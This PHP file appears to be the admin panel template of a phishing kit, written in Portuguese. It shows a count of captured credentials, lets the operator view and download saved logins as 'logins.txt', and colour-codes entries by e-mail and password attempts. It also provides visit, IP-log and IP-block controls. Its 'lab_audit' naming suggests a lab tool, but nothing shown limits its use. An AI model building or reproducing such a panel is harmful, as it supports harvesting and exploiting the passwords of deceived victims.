<?php
declare(strict_types=1);

function admin_header(string $title, string $active = 'dashboard'): void
{
    $user = e((string) ($_SESSION['admin_user'] ?? 'admin'));
    $panel = e(admin_panel_name());
    $redirectPage = basename((string) ($_SERVER['SCRIPT_NAME'] ?? 'index.php'));
    if (!preg_match('/^[a-z0-9_]+\.php$/i', $redirectPage)) {
        $redirectPage = 'index.php';
    }

    $loginCount = 0;
    if (admin_logged_in()) {
        $loginCount = lab_audit_storage()->getStats()['unique_credentials'] ?? 0;
    }
    $marqueeMsg = e(admin_marquee_message());
    $brandName = e(admin_panel_name());
    ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title><?= e($title) ?> — <?= $panel ?></title>
    <link href="assets/admin.css?v=8" rel="stylesheet">
</head>
<body class="admin-panel">
<header class="admin-header">
    <div class="header-brand">
        <div class="brand-marquee" aria-hidden="true">
            <div class="brand-marquee-track">
                <span class="marquee-piece marquee-brand"><?= $brandName ?></span>
                <span class="marquee-dot">✦</span>
                <span class="marquee-piece marquee-msg"><?= $marqueeMsg ?></span>
                <span class="marquee-dot">✦</span>
                <span class="marquee-piece marquee-brand"><?= $brandName ?></span>
                <span class="marquee-dot">✦</span>
                <span class="marquee-piece marquee-msg"><?= $marqueeMsg ?></span>
                <span class="marquee-dot">✦</span>
            </div>
        </div>
        <h1 class="sr-only"><?= $panel ?></h1>
    </div>
    <nav class="admin-nav">
        <div class="nav-group nav-group-main">
        <a href="index.php" class="nav-pill <?= $active === 'dashboard' ? 'active' : '' ?>">Dashboard</a>
        <button type="button" class="btn-nav-ver-logins nav-pill-accent" id="btn-open-console" title="Ver todos os logins">
            <span class="btn-mail-icon">📧</span>
            <span>Ver logins</span>
            <?php if ($loginCount > 0): ?>
                <span class="btn-badge"><?= (int) $loginCount ?></span>
            <?php endif; ?>
        </button>
        <a href="download_logins.php" class="btn-nav-download nav-pill-accent" title="Baixar logins.txt">
            <span>⬇</span>
            <span>Baixar logins</span>
        </a>
        </div>
        <div class="nav-group nav-group-tools">
        <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Apagar visitas?">
            <?= panel_action_field('clear:clicks') ?>
            <input type="hidden" name="action" value="clicks">
            <input type="hidden" name="redirect" value="<?= e($redirectPage) ?>">
            <button type="submit" class="btn-clear-clicks">Apagar visitas</button>
        </form>
        <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Apagar logs de IP?">
            <?= panel_action_field('clear:logs') ?>
            <input type="hidden" name="action" value="logs">
            <input type="hidden" name="redirect" value="<?= e($redirectPage) ?>">
            <button type="submit" class="btn-clear-logs">Apagar IPs</button>
        </form>
        <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Apagar todos os logins salvos?">
            <?= panel_action_field('clear:logins') ?>
            <input type="hidden" name="action" value="logins">
            <input type="hidden" name="redirect" value="<?= e($redirectPage) ?>">
            <button type="submit" class="btn-clear-logins">Apagar logins</button>
        </form>
        <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Liberar TODOS os IPs bloqueados? O site voltará a aceitar visitantes.">
            <?= panel_action_field('clear:blocked_ips') ?>
            <input type="hidden" name="action" value="blocked_ips">
            <input type="hidden" name="redirect" value="<?= e($redirectPage) ?>">
            <button type="submit" class="btn-clear-blocked">Liberar IPs bloqueados</button>
        </form>
        </div>
        <div class="nav-group nav-group-user">
        <a href="alterar_senha.php" class="nav-pill <?= $active === 'senha' ? 'active' : '' ?>">Senha</a>
        <span class="user-badge"><?= $user ?></span>
        <a href="logout.php" class="nav-sair nav-pill">Sair</a>
        </div>
    </nav>
</header>
<main class="admin-main">
    <?php
}

function admin_footer(): void
{
    $consoleJson = '[]';
    if (admin_logged_in()) {
        try {
            $entries = lab_audit_storage()->getConsoleEntries();
            $encoded = json_encode($entries, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_APOS);
            $consoleJson = $encoded !== false ? $encoded : '[]';
        } catch (Throwable $e) {
            $consoleJson = '[]';
        }
    }
    ?>
</main>

<div id="login-console" class="login-console" hidden aria-hidden="true">
    <div class="login-console-backdrop" data-close-console></div>
    <div class="login-console-panel">
        <div class="login-console-top">
            <div class="login-console-title">
                <span class="console-traffic" aria-hidden="true">
                    <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
                </span>
                <span class="console-dot"></span>
                <span><?= e(admin_panel_name()) ?></span>
                <span class="console-sub">logins salvos</span>
            </div>
            <button type="button" class="console-close" data-close-console aria-label="Fechar">✕</button>
        </div>
        <div class="login-console-legend">
            <span class="legend-green">● Verde</span> = 1º e-mail
            <span class="legend-yellow">● Amarelo</span> = mesmo e-mail, senha diferente
        </div>
        <div class="login-console-body" id="login-console-body">
            <div class="console-empty">Aguardando logins…</div>
        </div>
        <div class="login-console-foot">
            <button type="button" class="btn-sm btn-unblock" data-close-console>Fechar</button>
        </div>
    </div>
</div>

<script>window.LAB_AUDIT = <?= $consoleJson ?>;</script>
<script src="assets/admin.js?v=6"></script>
</body>
</html>
    <?php
}
